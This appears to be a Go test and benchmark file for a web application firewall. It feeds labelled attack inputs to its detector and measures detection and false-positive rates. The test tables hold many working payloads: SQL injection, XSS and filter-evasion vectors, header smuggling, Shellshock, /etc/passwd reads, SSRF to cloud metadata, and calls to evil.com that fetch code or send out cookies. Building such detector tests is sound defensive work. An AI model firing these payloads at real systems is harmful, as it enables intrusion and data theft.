package benchmarks

import (
	"bytes"
	"net/http/httptest"
	"net/url"
	"rhinowaf/waf/sanitize"
	"testing"
)

// Test SQL Injection detection accuracy
func TestSQLInjectionDetection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
	}{
		{"Clean input", "/?id=123&name=john", false},
		{"Basic OR injection", "/?id=1'+OR+'1'='1", true},
		{"Union select", "/?id=1+UNION+SELECT+*+FROM+users", true},
		{"Drop table", "/?id=1;+DROP+TABLE+users--", true},
		{"Comment injection", "/?user=admin'--", true},
		{"Stacked query", "/?id=1;+DELETE+FROM+users+WHERE+1=1", true},
		{"Order by injection", "/?id=1'+ORDER+BY+1--", true},
		{"Boolean based", "/?id=1'+AND+1=1--", true},
		{"Time based", "/?id=1'+AND+WAITFOR+DELAY+'00:00:05'--", true},
		{"Hex encoding", "/?id=0x53454c454354", true},
		{"Clean with numbers", "/?price=19.99&qty=5", false},
		{"Clean email", "/?email=test@example.com", false},
	}

	detected := 0
	falsePositives := 0
	falseNegatives := 0

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tt.input, nil)
			result := sanitize.IsMalicious(req)

			if result != tt.expected {
				if tt.expected && !result {
					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
					falseNegatives++
				} else {
					t.Errorf("FALSE POSITIVE: %s - Expected clean but flagged", tt.name)
					falsePositives++
				}
			} else if result {
				detected++
			}
		})
	}

	total := len(tests)
	malicious := 0
	for _, tt := range tests {
		if tt.expected {
			malicious++
		}
	}

	detectionRate := float64(detected) / float64(malicious) * 100
	fpRate := float64(falsePositives) / float64(total-malicious) * 100

	t.Logf("SQL Injection Detection Results:")
	t.Logf("  Total tests: %d", total)
	t.Logf("  Malicious samples: %d", malicious)
	t.Logf("  Detected: %d", detected)
	t.Logf("  Missed: %d", falseNegatives)
	t.Logf("  False positives: %d", falsePositives)
	t.Logf("  Detection rate: %.2f%%", detectionRate)
	t.Logf("  False positive rate: %.2f%%", fpRate)
}

// Test XSS detection accuracy
func TestXSSDetection(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected bool
		category string
	}{
		// Clean inputs
		{"Clean text", "/?msg=Hello+World", false, "clean"},
		{"Clean HTML entities", "/?msg=Hello+&amp;+goodbye", false, "clean"},
		{"Clean punctuation", "/?msg=Test!+Question?+Yes.", false, "clean"},
		{"Clean markdown", "/?msg=**bold**+and+*italic*", false, "clean"},

		// Basic XSS
		{"Basic script tag", "/?msg=<script>alert(1)</script>", true, "basic"},
		{"Script with src", "/?msg=<script+src='evil.js'></script>", true, "basic"},
		{"Event handler", "/?msg=<img+src=x+onerror=alert(1)>", true, "basic"},
		{"JavaScript protocol", "/?msg=javascript:alert(1)", true, "basic"},
		{"Iframe injection", "/?msg=<iframe+src='evil.com'></iframe>", true, "basic"},
		{"SVG with script", "/?msg=<svg+onload=alert(1)>", true, "basic"},
		{"Event in attribute", "/?msg=<div+onmouseover='alert(1)'>", true, "basic"},
		{"Body onload", "/?msg=<body+onload=alert(1)>", true, "basic"},
		{"Data URL", "/?msg=data:text/html,<script>alert(1)</script>", true, "basic"},

		// Advanced evasion
		{"Case variation", "/?msg=<ScRiPt>alert(1)</sCrIpT>", true, "evasion"},
		{"Tab separator", "/?msg=<img%09src=x%09onerror=alert(1)>", true, "evasion"},
		{"Newline separator", "/?msg=<img%0Asrc=x%0Aonerror=alert(1)>", true, "evasion"},
		{"Null byte bypass", "/?msg=<scri%00pt>alert(1)</scri%00pt>", true, "evasion"},
		{"Double encoding", "/?msg=%253Cscript%253Ealert(1)%253C/script%253E", true, "evasion"},
		{"Comment obfuscation", "/?msg=<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>", true, "evasion"},
		{"Backtick execution", "/?msg=<img+src=x+onerror=`alert(1)`>", true, "evasion"},

		// HTML5 vectors
		{"Form action", "/?msg=<form+action=javascript:alert(1)><input+type=submit>", true, "html5"},
		{"Link href", "/?msg=<link+rel=import+href=data:text/html,<script>alert(1)</script>>", true, "html5"},
		{"Meta refresh", "/?msg=<meta+http-equiv=refresh+content='0;url=javascript:alert(1)'>", true, "html5"},
		{"Video onerror", "/?msg=<video+src=x+onerror=alert(1)>", true, "html5"},
		{"Audio onerror", "/?msg=<audio+src=x+onerror=alert(1)>", true, "html5"},
		{"Object data", "/?msg=<object+data=javascript:alert(1)>", true, "html5"},
		{"Embed src", "/?msg=<embed+src=javascript:alert(1)>", true, "html5"},

		// Event handler variations
		{"onanimationend", "/?msg=<style>@keyframes+x{}</style><div+style=animation:x+onanimationend=alert(1)>", true, "events"},
		{"onanimationstart", "/?msg=<div+style=animation-name:x+onanimationstart=alert(1)>", true, "events"},
		{"ontransitionend", "/?msg=<div+style=transition:1s+ontransitionend=alert(1)>", true, "events"},
		{"onfocus autofocus", "/?msg=<input+autofocus+onfocus=alert(1)>", true, "events"},
		{"onpointerover", "/?msg=<div+onpointerover=alert(1)>hover</div>", true, "events"},
		{"ontoggle details", "/?msg=<details+open+ontoggle=alert(1)>", true, "events"},
		{"onloadstart", "/?msg=<video+onloadstart=alert(1)+src=x>", true, "events"},

		// SVG-based
		{"SVG animate", "/?msg=<svg><animate+onbegin=alert(1)+attributeName=x>", true, "svg"},
		{"SVG foreignObject", "/?msg=<svg><foreignObject><body+onload=alert(1)>", true, "svg"},
		{"SVG use href", "/?msg=<svg><use+href=data:image/svg+xml,<svg+id=x+onload=alert(1)>>", true, "svg"},
		{"SVG script href", "/?msg=<svg><script+href=javascript:alert(1)/>", true, "svg"},
		{"SVG set", "/?msg=<svg><set+attributeName=onmouseover+to=alert(1)>", true, "svg"},

		// Template injection
		{"Template literal", "/?msg=<template><script>${alert(1)}</script></template>", true, "template"},
		{"Slot element", "/?msg=<slot+onfocus=alert(1)+autofocus>", true, "template"},
		{"Custom element", "/?msg=<custom-element+onconnected=alert(1)>", true, "template"},

		// JavaScript context
		{"String escape", "/?msg=%27%3B+alert%281%29%3B%2F%2F", true, "js-context"},
		{"Template string", "/?msg=%60%3B+alert%281%29%3B%2F%2F", true, "js-context"},
		{"Unicode escape", "/?msg=%5Cu003cscript%5Cu003ealert%281%29%5Cu003c%2Fscript%5Cu003e", true, "js-context"},
		{"Octal escape", "/?msg=%5C74script%5C76alert%281%29%5C74%2Fscript%5C76", true, "js-context"},
		{"Hex escape", "/?msg=%5Cx3cscript%5Cx3ealert%281%29%5Cx3c%2Fscript%5Cx3e", true, "js-context"},

		// Protocol handlers
		{"vbscript protocol", "/?msg=<a+href=vbscript:msgbox(1)>click</a>", true, "protocol"},
		{"file protocol", "/?msg=<a+href=file:///etc/passwd>", true, "protocol"},
		{"data text/html", "/?msg=<a+href=data:text/html,<script>alert(1)</script>>", true, "protocol"},
		{"view-source", "/?msg=<a+href=view-source:javascript:alert(1)>", true, "protocol"},

		// CSS injection
		{"CSS expression", "/?msg=<div+style=width:expression(alert(1))>", true, "css"},
		{"CSS import", "/?msg=<style>@import%27javascript:alert(1)%27</style>", true, "css"},
		{"CSS url", "/?msg=<div+style=background:url(javascript:alert(1))>", true, "css"},
		{"CSS behavior", "/?msg=<div+style=behavior:url(evil.htc)>", true, "css"},

		// Polyglot attacks
		{"XSS-SQL polyglot", "/?msg=%27%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27+OR+%271%27%3D%271%27--", true, "polyglot"},
		{"Multi-context", "/?msg=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%27%3Balert%281%29%2F%2F%22%3Balert%281%29%2F%2F", true, "polyglot"},
		{"JSON polyglot", "/?msg=%7B%22xss%22%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%7D", true, "polyglot"},

		// Mutation XSS (mXSS)
		{"Backtick attribute", "/?msg=<div+id=`<img+src=x+onerror=alert(1)>`>", true, "mutation"},
		{"Noscript escape", "/?msg=<noscript><p+title=</noscript><img+src=x+onerror=alert(1)>>", true, "mutation"},
		{"Math context", "/?msg=<math><mi//xlink:href=javascript:alert(1)>click", true, "mutation"},

		// DOM-based patterns
		{"innerHTML assignment", "/?msg=<img+src=x+id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHA6Ly9ldmlsLmNvbS94c3MuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7+onerror=eval(atob(this.id))>", true, "dom"},
		{"Location hash", "/?msg=<base+href=javascript:alert(1)//>", true, "dom"},
		{"Document.write", "/?msg=<img+src=x+onerror=document.write(%27<script>alert(1)</script>%27)>", true, "dom"},

		// XML/XHTML vectors
		{"XML CDATA", "/?msg=<![CDATA[<script>alert(1)</script>]]>", true, "xml"},
		{"XML entity", "/?msg=<!ENTITY+xxe+SYSTEM+%27javascript:alert(1)%27>", true, "xml"},
		{"XHTML namespace", "/?msg=<html+xmlns:xss=%27http://www.w3.org/1999/xhtml%27><xss:script>alert(1)</xss:script>", true, "xml"},

		// Filter bypass techniques
		{"Broken tags", "/?msg=<<script>alert(1);//<</script>", true, "bypass"},
		{"Null char injection", "/?msg=<scr%00ipt>alert(1)</scr%00ipt>", true, "bypass"},
		{"Overlong UTF-8", "/?msg=%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE", true, "bypass"},
		{"Mixed encoding", "/?msg=&#60;script&#62;alert(1)&#60;/script&#62;", true, "bypass"},

		// Framework-specific
		{"Angular expression", "/?msg={{constructor.constructor(%27alert(1)%27)()}}", true, "framework"},
		{"React dangerouslySetInnerHTML", "/?msg=<div+dangerouslySetInnerHTML={{__html:%27<img+src=x+onerror=alert(1)>%27}}>", true, "framework"},
		{"Vue template", "/?msg=<div+v-html=%27<script>alert(1)</script>%27>", true, "framework"},
	}

	categoryResults := make(map[string]struct {
		total    int
		detected int
		missed   []string
	})

	detected := 0
	falsePositives := 0
	falseNegatives := 0
	totalMalicious := 0

	for _, tt := range tests {
		if tt.expected {
			totalMalicious++
		}

		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tt.input, nil)
			result := sanitize.IsMalicious(req)

			if categoryResults[tt.category].total == 0 {
				categoryResults[tt.category] = struct {
					total    int
					detected int
					missed   []string
				}{0, 0, []string{}}
			}

			cr := categoryResults[tt.category]
			cr.total++

			if result != tt.expected {
				if tt.expected && !result {
					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
					falseNegatives++
					cr.missed = append(cr.missed, tt.name)
				} else {
					t.Errorf("FALSE POSITIVE: %s - Expected clean but flagged", tt.name)
					falsePositives++
				}
			} else if result {
				detected++
				cr.detected++
			}

			categoryResults[tt.category] = cr
		})
	}

	t.Logf("\n=== XSS Detection Summary ===")
	for cat, res := range categoryResults {
		maliciousInCat := 0
		for _, tt := range tests {
			if tt.category == cat && tt.expected {
				maliciousInCat++
			}
		}

		if maliciousInCat > 0 {
			detRate := float64(res.detected) / float64(maliciousInCat) * 100
			t.Logf("\n%s:", cat)
			t.Logf("  Detection rate: %.2f%% (%d/%d)", detRate, res.detected, maliciousInCat)
			if len(res.missed) > 0 {
				t.Logf("  Missed: %v", res.missed)
			}
		}
	}

	detectionRate := float64(detected) / float64(totalMalicious) * 100
	fpRate := float64(falsePositives) / float64(len(tests)-totalMalicious) * 100

	t.Logf("\n=== Overall XSS Results ===")
	t.Logf("Total tests: %d", len(tests))
	t.Logf("Malicious samples: %d", totalMalicious)
	t.Logf("Detected: %d", detected)
	t.Logf("Missed: %d", falseNegatives)
	t.Logf("False positives: %d", falsePositives)
	t.Logf("Detection rate: %.2f%%", detectionRate)
	t.Logf("False positive rate: %.2f%%", fpRate)

	if detectionRate < 75.0 {
		t.Logf("\nWARNING: XSS detection rate below 75%% - consider improving filters")
	}
}

// Test header injection detection
func TestHeaderInjection(t *testing.T) {
	tests := []struct {
		name     string
		header   string
		value    string
		expected bool
		category string
	}{
		// Clean headers
		{"Valid User-Agent", "User-Agent", "Mozilla/5.0", false, "clean"},
		{"Valid Content-Type", "Content-Type", "application/json", false, "clean"},
		{"Valid Accept", "Accept", "text/html,application/json", false, "clean"},

		// CRLF injection
		{"CRLF injection basic", "X-Custom", "value\r\nInjected-Header: evil", true, "crlf"},
		{"CRLF with LF only", "X-Custom", "value\nSet-Cookie: session=hijacked", true, "crlf"},
		{"CRLF with CR only", "X-Custom", "value\rX-Forwarded-For: 127.0.0.1", true, "crlf"},
		{"Double CRLF response splitting", "X-Custom", "value\r\n\r\n<script>alert(1)</script>", true, "crlf"},
		{"CRLF URL encoded", "X-Custom", "value%0d%0aInjected: evil", true, "crlf"},
		{"CRLF double encoded", "X-Custom", "value%250d%250aInjected: evil", true, "crlf"},

		// Null byte injection
		{"Null byte attack", "X-Custom", "value\x00malicious", true, "null"},
		{"Null byte truncation", "X-Custom", "safe\x00<script>alert(1)</script>", true, "null"},
		{"Multiple null bytes", "X-Custom", "\x00\x00\x00evil", true, "null"},

		// HTTP smuggling patterns
		{"Transfer-Encoding smuggling", "Transfer-Encoding", "chunked\r\n\r\n0\r\n\r\nGET /admin", true, "smuggling"},
		{"Content-Length mismatch", "Content-Length", "5\r\nContent-Length: 100", true, "smuggling"},
		{"CL-TE smuggling", "X-Custom", "GET /\r\nContent-Length: 4\r\nTransfer-Encoding: chunked", true, "smuggling"},
		{"TE-CL smuggling", "X-Custom", "POST /\r\nTransfer-Encoding: chunked\r\nContent-Length: 4", true, "smuggling"},

		// Header pollution
		{"Duplicate Host header", "Host", "evil.com\r\nHost: victim.com", true, "pollution"},
		{"Multiple X-Forwarded-For", "X-Forwarded-For", "127.0.0.1\r\nX-Forwarded-For: attacker.com", true, "pollution"},
		{"Cookie pollution", "Cookie", "session=abc\r\nCookie: admin=true", true, "pollution"},

		// Cache poisoning
		{"X-Forwarded-Host inject", "X-Forwarded-Host", "evil.com\r\nCache-Control: public", true, "poisoning"},
		{"X-Original-URL", "X-Original-URL", "/admin\r\nX-Rewrite-URL: /public", true, "poisoning"},
		{"Vary header manipulation", "Vary", "User-Agent\r\nVary: *", true, "poisoning"},

		// Authorization bypass
		{"X-Original-URL bypass", "X-Original-URL", "/admin", true, "authz-bypass"},
		{"X-Rewrite-URL bypass", "X-Rewrite-URL", "/admin", true, "authz-bypass"},
		{"X-Forwarded-For localhost", "X-Forwarded-For", "127.0.0.1", true, "authz-bypass"},
		{"X-Custom-IP-Authorization", "X-Custom-IP-Authorization", "127.0.0.1", true, "authz-bypass"},

		// XSS via headers
		{"User-Agent XSS", "User-Agent", "<script>alert(1)</script>", true, "xss"},
		{"Referer XSS", "Referer", "javascript:alert(1)", true, "xss"},
		{"X-Forwarded-For XSS", "X-Forwarded-For", "<img src=x onerror=alert(1)>", true, "xss"},

		// Command injection
		{"User-Agent command", "User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'", true, "command"},
		{"Via header command", "Via", "`cat /etc/passwd`", true, "command"},
		{"X-Custom command", "X-Custom", "$(wget evil.com)", true, "command"},
	}

	categoryResults := make(map[string]struct {
		total    int
		detected int
		missed   []string
	})

	detected := 0
	falsePositives := 0
	falseNegatives := 0
	totalMalicious := 0

	for _, tt := range tests {
		if tt.expected {
			totalMalicious++
		}

		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", "/", nil)
			req.Header.Set(tt.header, tt.value)
			result := sanitize.IsMalicious(req)

			if categoryResults[tt.category].total == 0 {
				categoryResults[tt.category] = struct {
					total    int
					detected int
					missed   []string
				}{0, 0, []string{}}
			}

			cr := categoryResults[tt.category]
			cr.total++

			if result != tt.expected {
				if tt.expected && !result {
					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
					falseNegatives++
					cr.missed = append(cr.missed, tt.name)
				} else {
					t.Errorf("FALSE POSITIVE: %s - Expected clean but flagged", tt.name)
					falsePositives++
				}
			} else if result {
				detected++
				cr.detected++
			}

			categoryResults[tt.category] = cr
		})
	}

	t.Logf("\n=== Header Injection Detection Summary ===")
	for cat, res := range categoryResults {
		maliciousInCat := 0
		for _, tt := range tests {
			if tt.category == cat && tt.expected {
				maliciousInCat++
			}
		}

		if maliciousInCat > 0 {
			detRate := float64(res.detected) / float64(maliciousInCat) * 100
			t.Logf("\n%s:", cat)
			t.Logf("  Detection rate: %.2f%% (%d/%d)", detRate, res.detected, maliciousInCat)
			if len(res.missed) > 0 {
				t.Logf("  Missed: %v", res.missed)
			}
		}
	}

	detectionRate := float64(detected) / float64(totalMalicious) * 100
	fpRate := float64(falsePositives) / float64(len(tests)-totalMalicious) * 100

	t.Logf("\n=== Overall Header Injection Results ===")
	t.Logf("Total tests: %d", len(tests))
	t.Logf("Malicious samples: %d", totalMalicious)
	t.Logf("Detected: %d", detected)
	t.Logf("Missed: %d", falseNegatives)
	t.Logf("False positives: %d", falsePositives)
	t.Logf("Detection rate: %.2f%%", detectionRate)
	t.Logf("False positive rate: %.2f%%", fpRate)
}

// Test POST form sanitization
func TestPOSTFormSanitization(t *testing.T) {
	tests := []struct {
		name     string
		formData map[string]string
		expected bool
		category string
	}{
		// Clean inputs
		{"Clean form", map[string]string{"user": "john", "email": "test@example.com"}, false, "clean"},
		{"Valid JSON", map[string]string{"data": `{"name":"test","age":25}`}, false, "clean"},
		{"Normal password", map[string]string{"password": "S3cur3P@ss!"}, false, "clean"},

		// XSS in forms
		{"Basic XSS", map[string]string{"msg": "<script>alert(1)</script>"}, true, "xss"},
		{"Event handler", map[string]string{"comment": "<img src=x onerror=alert(1)>"}, true, "xss"},
		{"SVG injection", map[string]string{"bio": "<svg onload=alert(1)>"}, true, "xss"},
		{"JavaScript URL", map[string]string{"url": "javascript:alert(1)"}, true, "xss"},
		{"Data URI XSS", map[string]string{"link": "data:text/html,<script>alert(1)</script>"}, true, "xss"},

		// SQL injection in forms
		{"Classic SQL", map[string]string{"id": "1' OR '1'='1"}, true, "sqli"},
		{"Union-based", map[string]string{"search": "' UNION SELECT password FROM users--"}, true, "sqli"},
		{"Stacked query", map[string]string{"id": "1; DROP TABLE users--"}, true, "sqli"},
		{"Time-based blind", map[string]string{"id": "1' AND SLEEP(5)--"}, true, "sqli"},
		{"Boolean blind", map[string]string{"user": "admin' AND 1=1--"}, true, "sqli"},

		// Command injection
		{"Shell command", map[string]string{"file": "; cat /etc/passwd"}, true, "command"},
		{"Pipe command", map[string]string{"name": "test | whoami"}, true, "command"},
		{"Backtick exec", map[string]string{"input": "`id`"}, true, "command"},
		{"Command substitution", map[string]string{"param": "$(wget evil.com)"}, true, "command"},
		{"Shellshock", map[string]string{"agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"}, true, "command"},

		// Path traversal
		{"Directory traversal", map[string]string{"file": "../../../etc/passwd"}, true, "traversal"},
		{"Windows path", map[string]string{"path": "..\\..\\..\\windows\\system32\\config\\sam"}, true, "traversal"},
		{"Encoded traversal", map[string]string{"file": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"}, true, "traversal"},
		{"Double encoding", map[string]string{"file": "..%252f..%252f..%252fetc%252fpasswd"}, true, "traversal"},

		// LDAP injection
		{"LDAP injection", map[string]string{"user": "*)(uid=*))(|(uid=*"}, true, "ldap"},
		{"LDAP bypass", map[string]string{"filter": "admin)(&(password=*"}, true, "ldap"},

		// XML injection
		{"XXE attack", map[string]string{"xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>"}, true, "xml"},
		{"XML bomb", map[string]string{"data": "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;\">]><lolz>&lol1;</lolz>"}, true, "xml"},

		// SSRF
		{"SSRF localhost", map[string]string{"url": "http://localhost:8080/admin"}, true, "ssrf"},
		{"SSRF 127.0.0.1", map[string]string{"callback": "http://127.0.0.1/secrets"}, true, "ssrf"},
		{"SSRF metadata", map[string]string{"endpoint": "http://169.254.169.254/latest/meta-data/"}, true, "ssrf"},
		{"SSRF file protocol", map[string]string{"resource": "file:///etc/passwd"}, true, "ssrf"},

		// Template injection
		{"SSTI Jinja2", map[string]string{"template": "{{config.items()}}"}, true, "ssti"},
		{"SSTI eval", map[string]string{"expr": "${7*7}"}, true, "ssti"},
		{"SSTI Ruby", map[string]string{"template": "<%= system('cat /etc/passwd') %>"}, true, "ssti"},

		// NoSQL injection
		{"NoSQL bypass", map[string]string{"user": `{"$gt": ""}`}, true, "nosql"},
		{"MongoDB injection", map[string]string{"filter": `{"$ne": null}`}, true, "nosql"},
		{"NoSQL operator", map[string]string{"query": `{$where: "this.credits == this.debits"}`}, true, "nosql"},

		// Multipart/form-data attacks
		{"File upload PHP", map[string]string{"filename": "shell.php"}, true, "upload"},
		{"Double extension", map[string]string{"file": "image.jpg.php"}, true, "upload"},
		{"Null byte upload", map[string]string{"name": "shell.php%00.jpg"}, true, "upload"},

		// CRLF injection
		{"CRLF in form", map[string]string{"header": "value\r\nSet-Cookie: admin=true"}, true, "crlf"},
		{"Response splitting", map[string]string{"redirect": "/page\r\n\r\n<script>alert(1)</script>"}, true, "crlf"},

		// Expression language injection
		{"EL injection", map[string]string{"expr": "${applicationScope}"}, true, "el"},
		{"OGNL injection", map[string]string{"input": "%{#context['xwork.MethodAccessor.denyMethodExecution']=false}"}, true, "el"},
	}

	categoryResults := make(map[string]struct {
		total    int
		detected int
		missed   []string
	})

	detected := 0
	falsePositives := 0
	falseNegatives := 0
	totalMalicious := 0

	for _, tt := range tests {
		if tt.expected {
			totalMalicious++
		}

		t.Run(tt.name, func(t *testing.T) {
			form := url.Values{}
			for k, v := range tt.formData {
				form.Set(k, v)
			}

			req := httptest.NewRequest("POST", "/", bytes.NewBufferString(form.Encode()))
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			result := sanitize.IsMalicious(req)

			if categoryResults[tt.category].total == 0 {
				categoryResults[tt.category] = struct {
					total    int
					detected int
					missed   []string
				}{0, 0, []string{}}
			}

			cr := categoryResults[tt.category]
			cr.total++

			if result != tt.expected {
				if tt.expected && !result {
					t.Errorf("MISSED: %s - Expected malicious but passed", tt.name)
					falseNegatives++
					cr.missed = append(cr.missed, tt.name)
				} else {
					t.Errorf("FALSE POSITIVE: %s - Expected clean but flagged", tt.name)
					falsePositives++
				}
			} else if result {
				detected++
				cr.detected++
			}

			categoryResults[tt.category] = cr
		})
	}

	t.Logf("\n=== Form Sanitization Detection Summary ===")
	for cat, res := range categoryResults {
		maliciousInCat := 0
		for _, tt := range tests {
			if tt.category == cat && tt.expected {
				maliciousInCat++
			}
		}

		if maliciousInCat > 0 {
			detRate := float64(res.detected) / float64(maliciousInCat) * 100
			t.Logf("\n%s:", cat)
			t.Logf("  Detection rate: %.2f%% (%d/%d)", detRate, res.detected, maliciousInCat)
			if len(res.missed) > 0 {
				t.Logf("  Missed: %v", res.missed)
			}
		}
	}

	detectionRate := float64(detected) / float64(totalMalicious) * 100
	fpRate := float64(falsePositives) / float64(len(tests)-totalMalicious) * 100

	t.Logf("\n=== Overall Form Sanitization Results ===")
	t.Logf("Total tests: %d", len(tests))
	t.Logf("Malicious samples: %d", totalMalicious)
	t.Logf("Detected: %d", detected)
	t.Logf("Missed: %d", falseNegatives)
	t.Logf("False positives: %d", falsePositives)
	t.Logf("Detection rate: %.2f%%", detectionRate)
	t.Logf("False positive rate: %.2f%%", fpRate)
}

// Benchmark attack detection performance
func BenchmarkSQLInjectionDetection(b *testing.B) {
	req := httptest.NewRequest("GET", "/?id=1'+OR+'1'='1", nil)
	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		_ = sanitize.IsMalicious(req)
	}
}

func BenchmarkXSSDetection(b *testing.B) {
	req := httptest.NewRequest("GET", "/?msg=<script>alert(1)</script>", nil)
	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		_ = sanitize.IsMalicious(req)
	}
}

func BenchmarkComplexAttackDetection(b *testing.B) {
	req := httptest.NewRequest("GET", "/?id=1+UNION+SELECT+user,pass+FROM+admin+WHERE+'1'='1'--&msg=<script>document.location='http://evil.com/'+document.cookie</script>", nil)
	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		_ = sanitize.IsMalicious(req)
	}
}
